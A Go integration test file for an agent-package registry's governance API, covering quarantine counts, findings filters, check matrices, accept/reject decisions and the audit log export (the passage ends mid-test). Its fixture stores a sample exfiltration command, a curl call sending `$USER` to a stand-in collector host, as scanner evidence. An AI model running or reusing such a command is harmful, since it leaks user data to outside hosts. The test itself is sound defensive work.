//go:build integration

package api_test

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/require"

	"agent-manager/internal/api/contract"
	"agent-manager/internal/store/models"
)

// The two governance screens against a real Postgres.
//
// Everything asserted here is a guarantee the code cannot make on its own: that
// the quarantined figure counts what is presently blocked rather than every
// flagged row that ever existed, that the check matrix carries the passes, that
// one decision writes exactly one audit row, that a rejection really does stop a
// version being served, and that the export is the whole log rather than the
// page. A handler-shaped test with a fake store would pass against every one of
// those being broken.
//
// The fixture is built and torn down PER TEST rather than seeded once for the
// file. It has to be: this suite shares one database, `task test` runs with
// -shuffle=on, and catalog_integration_test.go asserts the unfiltered catalog
// total is exactly ten. A package left behind here would fail a test in another
// file, which is the least debuggable failure this suite can produce.

// govFixture is a small governed world: one package whose latest version is
// flagged and whose previous version is ALSO flagged, and a second package whose
// clean version carries an accepted finding.
type govFixture struct {
	quarantined     uuid.UUID // the latest flagged version
	superseded      uuid.UUID // an older flagged version of the same package
	clean           uuid.UUID // another package's clean latest version
	openFinding     uuid.UUID // high, open, on the latest flagged version
	oldFinding      uuid.UUID // medium, open, on the superseded version
	approvedFinding uuid.UUID // low, approved, with an active override
	reviewer        uuid.UUID
}

// govChecks is one scan's whole matrix: two deviations and three passes.
//
// The three passes are the point of the fixture. FR-025 asks for every check that
// ran precisely so the absence of a finding is distinguishable from the absence of
// a check, and a fixture with only the failing check cannot tell a detail pane
// that drops the passes from one that never had them.
var govChecks = []struct {
	id, label string
	result    models.CheckResult
	warns     int32
}{
	{"manifest-schema", "Manifest schema", models.CheckResultPass, 0},
	{"network-allowlist", "Network allowlist", models.CheckResultFail, 0},
	{"shell-command-audit", "Shell command audit", models.CheckResultWarn, 2},
	{"secret-exfiltration", "Secret exfiltration", models.CheckResultPass, 0},
	{"prompt-injection", "Prompt injection patterns", models.CheckResultPass, 0},
}

func seedGovernance(t *testing.T) govFixture {
	t.Helper()
	ctx := t.Context()

	insert := func(model any) {
		_, err := db.NewInsert().Model(model).Exec(ctx)
		require.NoError(t, err)
	}
	now := time.Now().UTC()

	publisher := &models.Publisher{
		ID: models.NewID(), Slug: "gov/security", DisplayName: "Governance Fixture",
	}
	insert(publisher)

	// Torn down in dependency order, not by cascade: package.latest_version_id and
	// version.package_id point at each other, so the pointer goes first. The
	// catalog file's "the unfiltered total is ten" assertions depend on this
	// running.
	t.Cleanup(func() {
		for _, statement := range []string{
			`update package set latest_version_id = null where publisher_id = ?`,
			`delete from finding_evidence where finding_id in (
			   select f.id from finding f join version v on v.id = f.version_id
			   join package p on p.id = v.package_id where p.publisher_id = ?)`,
			`delete from override where finding_id in (
			   select f.id from finding f join version v on v.id = f.version_id
			   join package p on p.id = v.package_id where p.publisher_id = ?)`,
			`delete from finding where version_id in (
			   select v.id from version v join package p on p.id = v.package_id
			   where p.publisher_id = ?)`,
			`delete from scan_check where scan_id in (
			   select s.id from scan s join version v on v.id = s.version_id
			   join package p on p.id = v.package_id where p.publisher_id = ?)`,
			`delete from scan where version_id in (
			   select v.id from version v join package p on p.id = v.package_id
			   where p.publisher_id = ?)`,
			`delete from version where package_id in (select id from package where publisher_id = ?)`,
			`delete from package where publisher_id = ?`,
			`delete from publisher where id = ?`,
		} {
			_, err := db.ExecContext(context.Background(), statement, publisher.ID)
			require.NoError(t, err)
		}
	})

	newPackage := func(name string) uuid.UUID {
		pkg := &models.Package{
			ID: models.NewID(), PublisherID: publisher.ID, Namespace: "gov", Name: name,
			Kind: models.PackageKindSkill, Visibility: models.PackageVisibilityOrganisation,
		}
		insert(pkg)
		return pkg.ID
	}
	newVersion := func(pkg uuid.UUID, name, semver string, verdict models.Verdict,
		tag models.DistTag, age time.Duration) uuid.UUID {
		version := &models.Version{
			ID: models.NewID(), PackageID: pkg, Semver: semver, SemverSort: semver,
			ObjectKey: fmt.Sprintf("skills/gov/%s/%s/bundle.tar.zst", name, semver),
			Digest:    bundleSHA, Manifest: json.RawMessage(`{"name":"` + name + `"}`),
			Tags: []string{}, DistTag: tag, Verdict: verdict, Visible: true,
			CreatedAt: now.Add(-age),
		}
		insert(version)
		if tag == models.DistTagLatest {
			_, err := db.NewUpdate().Model((*models.Package)(nil)).
				Set("latest_version_id = ?", version.ID).Where("id = ?", pkg).Exec(ctx)
			require.NoError(t, err)
		}
		return version.ID
	}

	riskyPkg := newPackage("risky-digest")
	fixture := govFixture{
		// The superseded flagged version. It is real history and it quarantines
		// nothing, because nothing resolves to it.
		superseded: newVersion(riskyPkg, "risky-digest", "0.9.0",
			models.VerdictFlagged, models.DistTagNone, 45*24*time.Hour),
		quarantined: newVersion(riskyPkg, "risky-digest", "1.0.0",
			models.VerdictFlagged, models.DistTagLatest, 2*time.Hour),
	}
	cleanPkg := newPackage("tidy-report")
	fixture.clean = newVersion(cleanPkg, "tidy-report", "2.0.0",
		models.VerdictClean, models.DistTagLatest, 3*time.Hour)

	// Three scans, and the durations are chosen so the median is a value neither
	// of them holds: 18 s and 12 s interpolate to 15 s, which is what tells a
	// percentile apart from a "pick a row" implementation. The third finished 45
	// days ago and is outside every window this file asks for.
	newScan := func(version uuid.UUID, verdict models.Verdict, age, took time.Duration,
		matrix bool) uuid.UUID {
		started := now.Add(-age)
		finished := started.Add(took)
		scan := &models.Scan{
			ID: models.NewID(), VersionID: version, PackVersion: "gov-1.0.0",
			StartedAt: started, FinishedAt: &finished, Verdict: verdict, UpdatedAt: finished,
		}
		insert(scan)
		if matrix {
			for _, check := range govChecks {
				insert(&models.ScanCheck{
					ScanID: scan.ID, CheckID: check.id, Label: check.label,
					Result: check.result, WarnCount: check.warns, CreatedAt: finished,
				})
			}
		}
		return scan.ID
	}
	riskyScan := newScan(fixture.quarantined, models.VerdictFlagged, 2*time.Hour, 18*time.Second, true)
	cleanScan := newScan(fixture.clean, models.VerdictClean, 3*time.Hour, 12*time.Second, false)
	oldScan := newScan(fixture.superseded, models.VerdictFlagged, 45*24*time.Hour, 90*time.Second, false)

	line := func(n int32) *int32 { return &n }
	newFinding := func(scan, version uuid.UUID, rule string, severity models.FindingSeverity,
		state models.FindingState, path string, at int32) uuid.UUID {
		finding := &models.Finding{
			ID: models.NewID(), ScanID: scan, VersionID: version, RuleID: rule,
			Severity: severity, Title: rule + " raised", Detail: "The prose explanation.",
			EvidencePath: path, EvidenceLine: line(at),
			EvidenceQuote: `curl -sS "https://collect.example.invalid/v1/ping?u=$USER"`,
			State:         state, CreatedAt: now.Add(-time.Hour), UpdatedAt: now.Add(-time.Hour),
		}
		insert(finding)
		return finding.ID
	}

	fixture.openFinding = newFinding(riskyScan, fixture.quarantined, "GOV-NET-001",
		models.FindingSeverityHigh, models.FindingStateOpen, "scripts/digest.sh", 41)
	fixture.oldFinding = newFinding(oldScan, fixture.superseded, "GOV-DEP-004",
		models.FindingSeverityMedium, models.FindingStateOpen, "scripts/install.sh", 7)
	fixture.approvedFinding = newFinding(cleanScan, fixture.clean, "GOV-FS-007",
		models.FindingSeverityLow, models.FindingStateApproved, "scripts/report.sh", 9)

	// One cause and two consequences. A schema holding one location per finding
	// would drop the two, and this is what notices if the read does.
	for _, evidence := range []struct {
		path string
		at   int32
		role models.EvidenceRole
	}{
		{"scripts/digest.sh", 41, models.EvidenceRolePrimary},
		{"scripts/digest.sh", 58, models.EvidenceRoleSupporting},
		{"hooks/postinstall.sh", 12, models.EvidenceRoleSupporting},
	} {
		insert(&models.FindingEvidence{
			ID: models.NewID(), FindingID: fixture.openFinding, Path: evidence.path,
			Line: line(evidence.at), Quote: "the quoted line", Role: evidence.role,
		})
	}

	fixture.reviewer = principalFor(t, an).IdentityID
	expires := now.Add(12 * 24 * time.Hour)
	insert(&models.Override{
		FindingID: fixture.approvedFinding, ReviewerIdentityID: fixture.reviewer,
		Note: "Report output is redirected by the caller.", ExpiresAt: &expires,
	})
	return fixture
}

// ---- helpers ----------------------------------------------------------------

func getJSON[T any](t *testing.T, handler http.Handler, token, path string) T {
	t.Helper()

	rec := request(t, handler, http.MethodGet, path, token, "")
	require.Equal(t, http.StatusOK, rec.Code, "%s answered %s", path, rec.Body.String())

	var body T
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &body))
	return body
}

func auditRowCount(t *testing.T) int {
	t.Helper()

	count, err := db.NewSelect().Model((*models.AuditEvent)(nil)).Count(t.Context())
	require.NoError(t, err)
	return count
}

func findingRow(t *testing.T, id uuid.UUID) models.Finding {
	t.Helper()

	var row models.Finding
	require.NoError(t, db.NewSelect().Model(&row).Where("id = ?", id).Scan(t.Context()))
	return row
}

func versionVerdict(t *testing.T, id uuid.UUID) models.Verdict {
	t.Helper()

	var verdict models.Verdict
	require.NoError(t, db.NewSelect().Model((*models.Version)(nil)).
		Column("verdict").Where("id = ?", id).Scan(t.Context(), &verdict))
	return verdict
}

// ---- T062: the summary -------------------------------------------------------

// The inherited fact this asserts: the representative dataset carries three
// flagged versions while the design's card reads 2, and the figure only resolves
// if the count is of LATEST VISIBLE flagged versions. The fixture reproduces the
// shape — one package with two flagged versions, one of them superseded — and the
// delta must be one, not two.
func TestTheQuarantinedFigureCountsWhatIsBlockedNowAndNotEveryFlaggedVersionEverRaised(t *testing.T) {
	handler := liveHandler(t)

	before := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary")
	fixture := seedGovernance(t)
	after := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary")

	require.Equal(t, before.Quarantined+1, after.Quarantined,
		"two flagged versions were added and only one of them is the latest: a count of every "+
			"flagged row would report a risk no profile is exposed to")

	// The negative control: the superseded version really is flagged, so the
	// assertion above is about the latest-version relation and not about the seed
	// having quietly written something else.
	require.Equal(t, models.VerdictFlagged, versionVerdict(t, fixture.superseded))
	require.Equal(t, models.VerdictFlagged, versionVerdict(t, fixture.quarantined))
}

func TestTheSummaryPeriodBoundsWhatItCounts(t *testing.T) {
	handler := liveHandler(t)

	before := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary")
	seedGovernance(t)

	within := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary?days=30")
	require.Equal(t, 30, within.PeriodDays, "the window must be echoed, so no caption is a constant")
	require.Equal(t, before.VersionsScanned+2, within.VersionsScanned,
		"three scans were added and one of them finished 45 days ago")

	wider := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary?days=60")
	require.Equal(t, before.VersionsScanned+3, wider.VersionsScanned,
		"widening the window must reach the scan the narrow one excluded")
	require.Equal(t, 60, wider.PeriodDays)
}

// 18 s and 12 s interpolate to 15 s. A "middle row" implementation would answer
// 12 or 18, and both would look plausible on a screen.
func TestTheMedianScanTimeIsAPercentileAndNotAPickedRow(t *testing.T) {
	handler := liveHandler(t)

	total, err := db.NewSelect().Model((*models.Scan)(nil)).Count(t.Context())
	require.NoError(t, err)
	require.Zero(t, total, "this assertion is exact, so it needs the scan table to itself")

	seedGovernance(t)

	summary := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary?days=30")
	require.NotNil(t, summary.MedianSeconds, "two scans finished inside the window")
	require.InDelta(t, 15.0, *summary.MedianSeconds, 0.001)
}

// An active override is one on a finding that is still approved. The count and the
// nearest expiry read the same predicate, so a decision that later reverses stops
// counting in both.
func TestActiveOverridesAreCountedWithTheirNearestExpiry(t *testing.T) {
	handler := liveHandler(t)

	before := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary")
	seedGovernance(t)
	after := getJSON[contract.ScannerSummary](t, handler, kw.token, "/v1/scanner/summary")

	require.Equal(t, before.OverridesActive+1, after.OverridesActive)
	require.NotNil(t, after.NearestExpiry)
	require.WithinDuration(t, time.Now().UTC().Add(12*24*time.Hour), *after.NearestExpiry, time.Minute)
}

// ---- T063: the findings list -------------------------------------------------

func TestTheFindingsListFiltersBySeverityAndStateAndCarriesTheSubject(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	all := getJSON[contract.FindingsPage](t, handler, kw.token, "/v1/findings?pageSize=100")
	byID := map[string]contract.FindingSummary{}
	for _, finding := range all.Findings {
		byID[finding.ID] = finding
	}
	require.Contains(t, byID, fixture.openFinding.String())
	require.Contains(t, byID, fixture.oldFinding.String())
	require.Contains(t, byID, fixture.approvedFinding.String())

	open := byID[fixture.openFinding.String()]
	require.Equal(t, "gov/risky-digest", open.PackageID)
	require.Equal(t, "1.0.0", open.Version)
	require.Equal(t, "flagged", open.Verdict, "the row carries the VERSION's verdict, not the state")
	require.Equal(t, "scripts/digest.sh", open.EvidencePath)
	require.NotNil(t, open.EvidenceLine)
	require.Equal(t, 41, *open.EvidenceLine)

	// An accepted finding leaves its version alone: the override is what lets it
	// through, and a row that reported `clean` here would say the finding had gone
	// away rather than been accepted.
	approved := byID[fixture.approvedFinding.String()]
	require.Equal(t, "approved", approved.State)
	require.Equal(t, "clean", approved.Verdict)

	for _, tc := range []struct {
		name, query string
		want        []uuid.UUID
		absent      []uuid.UUID
	}{
		{
			name:   "state open excludes the accepted one",
			query:  "state=open",
			want:   []uuid.UUID{fixture.openFinding, fixture.oldFinding},
			absent: []uuid.UUID{fixture.approvedFinding},
		},
		{
			name:   "severity high is only the high one",
			query:  "severity=high",
			want:   []uuid.UUID{fixture.openFinding},
			absent: []uuid.UUID{fixture.oldFinding, fixture.approvedFinding},
		},
		{
			name:   "the two filters compose",
			query:  "state=open&severity=medium",
			want:   []uuid.UUID{fixture.oldFinding},
			absent: []uuid.UUID{fixture.openFinding, fixture.approvedFinding},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			page := getJSON[contract.FindingsPage](t, handler, kw.token,
				"/v1/findings?pageSize=100&"+tc.query)
			ids := make([]string, 0, len(page.Findings))
			for _, finding := range page.Findings {
				ids = append(ids, finding.ID)
			}
			for _, id := range tc.want {
				require.Contains(t, ids, id.String())
			}
			for _, id := range tc.absent {
				require.NotContains(t, ids, id.String())
			}
			require.Equal(t, len(page.Findings), page.Total,
				"the total must be counted under the same filters as the page")
		})
	}
}

// Severity descending means high first, and it means it through the Postgres enum
// rather than alphabetically — alphabetical would read high, low, medium, which
// looks sorted and is not.
func TestFindingsAreOrderedBySeverityThroughTheEnumAndNotAlphabetically(t *testing.T) {
	handler := liveHandler(t)
	seedGovernance(t)

	page := getJSON[contract.FindingsPage](t, handler, kw.token, "/v1/findings?pageSize=100")

	rank := map[string]int{"high": 0, "medium": 1, "low": 2}
	for i := 1; i < len(page.Findings); i++ {
		require.LessOrEqual(t, rank[page.Findings[i-1].Severity], rank[page.Findings[i].Severity],
			"%s came before %s", page.Findings[i-1].Severity, page.Findings[i].Severity)
	}
}

func TestTheFindingsPageClampsAStalePageNumber(t *testing.T) {
	handler := liveHandler(t)
	seedGovernance(t)

	page := getJSON[contract.FindingsPage](t, handler, kw.token, "/v1/findings?pageSize=1&page=99")
	require.Len(t, page.Findings, 1, "a page past the end shows the last one, not an empty table")
	require.Positive(t, page.Total)
	require.Equal(t, page.Total, page.Page, "with one row per page the last page is the total")
}

// ---- T064: the detail pane ---------------------------------------------------

// 001 US4 scenario 2, and the requirement it is easiest to satisfy wrongly. A
// pane fed only the failing check cannot be told apart from one where nothing else
// ran, so the passes are the assertion.
func TestTheFindingDetailCarriesEveryCheckThatRanAndNotOnlyTheFailingOne(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	detail := getJSON[contract.FindingDetail](t, handler, kw.token,
		"/v1/findings/"+fixture.openFinding.String())

	require.Len(t, detail.Checks, len(govChecks),
		"every registered check the scan ran must be present, passes included (FR-025)")

	results := map[string]contract.FindingCheck{}
	for _, check := range detail.Checks {
		results[check.CheckID] = check
	}
	require.Equal(t, "pass", results["manifest-schema"].Result)
	require.Equal(t, "pass", results["prompt-injection"].Result)
	require.Equal(t, "fail", results["network-allowlist"].Result)
	require.Equal(t, "warn", results["shell-command-audit"].Result)
	require.Equal(t, 2, results["shell-command-audit"].WarnCount)

	// The label comes off the row rather than out of a map in the renderer, so a
	// check registered after the screen shipped still has a name.
	require.Equal(t, "Network allowlist", results["network-allowlist"].Label)
}

func TestTheFindingDetailCarriesEveryEvidenceLocationCauseFirst(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	detail := getJSON[contract.FindingDetail](t, handler, kw.token,
		"/v1/findings/"+fixture.openFinding.String())

	require.Len(t, detail.Evidence, 3,
		"one cause and two consequences: a pane showing one location is not showing the finding")
	require.Equal(t, "primary", detail.Evidence[0].Role, "the cause leads")
	require.Equal(t, "scripts/digest.sh", detail.Evidence[0].Path)
	require.NotNil(t, detail.Evidence[0].Line)
	require.Equal(t, 41, *detail.Evidence[0].Line)

	paths := []string{}
	for _, evidence := range detail.Evidence[1:] {
		require.Equal(t, "supporting", evidence.Role)
		paths = append(paths, evidence.Path)
	}
	require.Contains(t, paths, "hooks/postinstall.sh")
}

func TestTheFindingDetailNamesTheScanAndTheReviewerWhoAcceptedIt(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	open := getJSON[contract.FindingDetail](t, handler, kw.token,
		"/v1/findings/"+fixture.openFinding.String())
	require.Equal(t, "gov-1.0.0", open.Scan.PackVersion,
		"which rule pack saw these bytes is what makes a rescan a comparison")
	require.NotNil(t, open.Scan.FinishedAt)
	require.False(t, open.Scan.TimedOut)
	require.Nil(t, open.Override, "an open finding has no override")

	accepted := getJSON[contract.FindingDetail](t, handler, kw.token,
		"/v1/findings/"+fixture.approvedFinding.String())
	require.NotNil(t, accepted.Override)
	require.Equal(t, an.claims.Email, accepted.Override.Reviewer,
		"the override names the identity that decided, read off the override row")
	require.NotEmpty(t, accepted.Override.Note)
	require.NotNil(t, accepted.Override.ExpiresAt)
}

func TestAFindingThatDoesNotExistIsAFourOhFour(t *testing.T) {
	handler := liveHandler(t)

	rec := request(t, handler, http.MethodGet,
		"/v1/findings/"+uuid.Must(uuid.NewV7()).String(), kw.token, "")
	require.Equal(t, http.StatusNotFound, rec.Code, rec.Body.String())
}

// ---- T065: accept ------------------------------------------------------------

// SC-111 and FR-050: exactly one audit row per action. Two would be as wrong as
// none, and it is the kind of defect that only shows up in the log nobody reads.
func TestAcceptingAFindingWritesTheStateTheOverrideAndExactlyOneAuditRow(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	before := auditRowCount(t)
	rec := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/accept", an.token,
		`{"note":"Egress is to our own collector","expiresInDays":12}`)
	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())

	var decision contract.FindingDecision
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &decision))
	require.Equal(t, "approved", decision.State)
	require.NotNil(t, decision.ExpiresAt)
	require.WithinDuration(t, time.Now().UTC().Add(12*24*time.Hour), *decision.ExpiresAt, time.Minute)

	require.Equal(t, before+1, auditRowCount(t), "one decision, one audit row")

	var event models.AuditEvent
	require.NoError(t, db.NewSelect().Model(&event).
		Order("occurred_at desc").Limit(1).Scan(t.Context()))
	require.Equal(t, models.AuditKindApprove, event.Kind)
	require.Equal(t, models.ActorKindIdentity, event.ActorKind)
	require.Equal(t, an.claims.Email, event.Actor, "the row names the reviewer, not the role")
	require.Contains(t, event.Text, "gov/risky-digest@1.0.0")
	require.Contains(t, event.Text, "GOV-NET-001")

	require.Equal(t, models.FindingStateApproved, findingRow(t, fixture.openFinding).State)

	// The version stays flagged. US4 scenario 3 makes it distributable SUBJECT TO
	// THE GATE, and the override is what the gate reads; a verdict rewritten to
	// clean would make an accepted version indistinguishable from one that never
	// had a finding.
	require.Equal(t, models.VerdictFlagged, versionVerdict(t, fixture.quarantined))
	require.Equal(t, "flagged", decision.Verdict)

	var override models.Override
	require.NoError(t, db.NewSelect().Model(&override).
		Where("finding_id = ?", fixture.openFinding).Scan(t.Context()))
	require.Equal(t, fixture.reviewer, override.ReviewerIdentityID)
	require.Equal(t, "Egress is to our own collector", override.Note)
	require.NotNil(t, override.ExpiresAt, "FR-028 asks for an expiry, and none is written null")
}

func TestAnAcceptanceWithNoStatedLifetimeGetsABoundedOneRatherThanNone(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	rec := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/accept", an.token, `{"note":"accepted"}`)
	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())

	var override models.Override
	require.NoError(t, db.NewSelect().Model(&override).
		Where("finding_id = ?", fixture.openFinding).Scan(t.Context()))
	require.NotNil(t, override.ExpiresAt,
		"an override with no expiry is a permanent exception, which FR-028 does not allow")
	require.True(t, override.ExpiresAt.After(time.Now().UTC()))
}

// Re-accepting is what a reviewer extending an expiring override does. It must
// replace the decision — including who made it — rather than fail on the primary
// key or leave the previous reviewer's name against a new note.
func TestReacceptingReplacesTheDecisionRatherThanFailingOrDuplicatingIt(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	first := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.approvedFinding.String()+"/accept", an.token,
		`{"note":"first pass","expiresInDays":5}`)
	require.Equal(t, http.StatusOK, first.Code, first.Body.String())

	before := auditRowCount(t)
	second := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.approvedFinding.String()+"/accept", an.token,
		`{"note":"extended after review","expiresInDays":40}`)
	require.Equal(t, http.StatusOK, second.Code, second.Body.String())
	require.Equal(t, before+1, auditRowCount(t), "the second decision is also one row")

	count, err := db.NewSelect().Model((*models.Override)(nil)).
		Where("finding_id = ?", fixture.approvedFinding).Count(t.Context())
	require.NoError(t, err)
	require.Equal(t, 1, count, "override is keyed by finding, so there is one row to extend")

	var override models.Override
	require.NoError(t, db.NewSelect().Model(&override).
		Where("finding_id = ?", fixture.approvedFinding).Scan(t.Context()))
	require.Equal(t, "extended after review", override.Note)
	require.True(t, override.ExpiresAt.After(time.Now().UTC().Add(30*24*time.Hour)))
}

// ---- T066: reject ------------------------------------------------------------

// FR-029, and it is the whole of what makes reject different from accept: a
// rejected version is not resolvable by any profile REGARDLESS OF GATE, so the
// mechanism has to be something no gate consults. The verdict is that, and the
// bundle refusal below is the observable consequence.
func TestRejectingAFindingQuarantinesTheVersionForGoodAndStopsItBeingServed(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	before := auditRowCount(t)
	rec := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/reject", an.token,
		`{"note":"publisher is shipping a fix"}`)
	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())

	var decision contract.FindingDecision
	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &decision))
	require.Equal(t, "rejected", decision.State)
	require.Equal(t, "rejected", decision.Verdict)
	require.Nil(t, decision.ExpiresAt, "a rejection does not lapse, so it carries no expiry")

	require.Equal(t, models.FindingStateRejected, findingRow(t, fixture.openFinding).State)
	require.Equal(t, models.VerdictRejected, versionVerdict(t, fixture.quarantined))
	require.Equal(t, before+1, auditRowCount(t))

	// The consequence a profile would feel. queries.BundleRef refuses a rejected
	// version independently of the gate, so this 403 is FR-029 observable from
	// outside.
	bundle := request(t, handler, http.MethodGet,
		"/v1/bundles/gov/risky-digest/1.0.0", kw.token, "")
	require.Equal(t, http.StatusForbidden, bundle.Code, bundle.Body.String())

	// No override was written, and one on another finding would not have been
	// removed either: am_api holds no DELETE on the table, and the row is the
	// record of a decision that really was taken.
	count, err := db.NewSelect().Model((*models.Override)(nil)).
		Where("finding_id = ?", fixture.openFinding).Count(t.Context())
	require.NoError(t, err)
	require.Zero(t, count)
}

// Reject is terminal, which means accept cannot walk it back. An "un-reject" is a
// real operation with real consequences and it is not this one wearing a different
// body.
func TestARejectedFindingCannotBeAcceptedAfterwards(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	first := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/reject", an.token, `{}`)
	require.Equal(t, http.StatusOK, first.Code, first.Body.String())

	before := auditRowCount(t)
	second := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/accept", an.token, `{"note":"on reflection"}`)
	require.Equal(t, http.StatusConflict, second.Code, second.Body.String())

	require.Equal(t, before, auditRowCount(t), "a refused decision writes nothing")
	require.Equal(t, models.FindingStateRejected, findingRow(t, fixture.openFinding).State)
	require.Equal(t, models.VerdictRejected, versionVerdict(t, fixture.quarantined))
}

// The role check is enforced against a real session and a real group mapping, not
// against a hand-built principal: `contractor` is in a group that maps to nothing,
// and FR-126's screen-level absence is not what stops the request.
func TestAnIdentityWithoutTheReviewerRoleCannotDecideEvenWithARealSession(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	before := auditRowCount(t)
	for _, path := range []string{"/accept", "/reject"} {
		rec := request(t, handler, http.MethodPost,
			"/v1/findings/"+fixture.openFinding.String()+path, contractor.token, `{"note":"n"}`)
		require.Equal(t, http.StatusForbidden, rec.Code, rec.Body.String())
	}
	require.Equal(t, before, auditRowCount(t), "a refused request writes nothing")
	require.Equal(t, models.FindingStateOpen, findingRow(t, fixture.openFinding).State)
}

// ---- T067 and T068: the audit log and its export -----------------------------

func TestTheAuditPageIsNewestFirstAndPagesWithoutRepeatingARow(t *testing.T) {
	handler := liveHandler(t)

	first := getJSON[contract.AuditPage](t, handler, kw.token, "/v1/audit?pageSize=2&page=1")
	require.LessOrEqual(t, len(first.Entries), 2)
	require.GreaterOrEqual(t, first.Total, len(first.Entries))

	for i := 1; i < len(first.Entries); i++ {
		require.False(t, first.Entries[i].OccurredAt.After(first.Entries[i-1].OccurredAt),
			"the page is ordered by when it happened, newest first")
	}

	if first.Total > 2 {
		second := getJSON[contract.AuditPage](t, handler, kw.token, "/v1/audit?pageSize=2&page=2")
		seen := map[string]bool{}
		for _, entry := range first.Entries {
			seen[entry.ID] = true
		}
		for _, entry := range second.Entries {
			require.False(t, seen[entry.ID],
				"a row appearing on two pages means the order is not total: the id tiebreak is "+
					"what stops rows written in the same instant from swapping between reads")
		}
	}
}

// FR-051: the full current scope, not merely the visible page. The page size is
// deliberately one, so an export that returned "the page" would return one row.
func TestTheAuditExportIsTheWholeLogAndNotTheVisiblePage(t *testing.T) {
	handler := liveHandler(t)
	fixture := seedGovernance(t)

	// A decision, so there is something in the log this test caused.
	accept := request(t, handler, http.MethodPost,
		"/v1/findings/"+fixture.openFinding.String()+"/accept", an.token,
		`{"note":"for the log"}`)
	require.Equal(t, http.StatusOK, accept.Code, accept.Body.String())

	page := getJSON[contract.AuditPage](t, handler, kw.token, "/v1/audit?pageSize=1")
	require.Len(t, page.Entries, 1)
	require.Greater(t, page.Total, 1, "this assertion needs a log longer than one page")

	rec := request(t, handler, http.MethodGet, "/v1/audit/export", kw.token, "")
	require.Equal(t, http.StatusOK, rec.Code, rec.Body.String())
	require.Equal(t, "application/x-ndjson", rec.Header().Get("Content-Type"))
	require.Contains(t, rec.Header().Get("Content-Disposition"), "attachment")

	rows, trailer := readExport(t, rec.Body.Bytes())
	require.Equal(t, page.Total, len(rows),
		"the export is every row, not the page: %d rows for a log of %d", len(rows), page.Total)
	require.NotNil(t, trailer, "a stream with no completeness sentinel cannot be told from a truncated one")
	require.True(t, trailer.Complete)
	require.Equal(t, len(rows), trailer.Rows)

	// Newest first, like the page, and the same shape per row — the two reads share
	// one select for exactly this reason.
	for i := 1; i < len(rows); i++ {
		require.False(t, rows[i].OccurredAt.After(rows[i-1].OccurredAt))
	}
	require.Equal(t, page.Entries[0].ID, rows[0].ID)
}

// readExport parses the NDJSON stream: every line an audit row, except the last,
// which is the completeness sentinel.
func readExport(t *testing.T, body []byte) ([]contract.AuditEntry, *contract.AuditExportTrailer) {
	t.Helper()

	var (
		rows    []contract.AuditEntry
		trailer *contract.AuditExportTrailer
	)
	scanner := bufio.NewScanner(bytes.NewReader(body))
	scanner.Buffer(make([]byte, 0, 64*1024), 1<<20)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		// The sentinel is told apart by the field it has and a row does not, rather
		// than by being last: a consumer that assumed position would read a
		// truncated export's final audit row as the sentinel.
		if strings.Contains(line, `"complete"`) {
			var parsed contract.AuditExportTrailer
			require.NoError(t, json.Unmarshal([]byte(line), &parsed))
			trailer = &parsed
			continue
		}
		var entry contract.AuditEntry
		require.NoError(t, json.Unmarshal([]byte(line), &entry), "line was %s", line)
		rows = append(rows, entry)
	}
	require.NoError(t, scanner.Err())
	return rows, trailer
}

// ---- T069: the badges --------------------------------------------------------

// The badge and the screen beside it must agree. A count that differed from the
// list under it is a count nobody trusts twice, and the catalog's own total is the
// only definition of "packages visible in the catalog" that exists.
func TestThePackageBadgeIsTheCatalogsOwnTotal(t *testing.T) {
	seedCatalog(t)
	handler := liveHandler(t)

	badges := getJSON[contract.Badges](t, handler, kw.token, "/v1/badges")
	page := getJSON[contract.CatalogPage](t, handler, kw.token, "/v1/packages?pageSize=1")

	require.Equal(t, page.Total, badges.Packages)
	require.Positive(t, badges.Packages, "the fixture has packages, so this is not vacuously true")
}

// FR-044 at global scope. The profile badge is the length of the list the Profiles
// screen shows: a count including a profile the reader cannot open would leak its
// existence by arithmetic, which is the hazard the package detail's pinned-by
// count already documents one screen down.
func TestTheProfileBadgeIsExactlyWhatTheIdentityMayRead(t *testing.T) {
	handler := liveHandler(t)

	for _, who := range []*actor{&kw, &an, &contractor} {
		badges := getJSON[contract.Badges](t, handler, who.token, "/v1/badges")
		profiles := getJSON[contract.ProfileList](t, handler, who.token, "/v1/profiles")
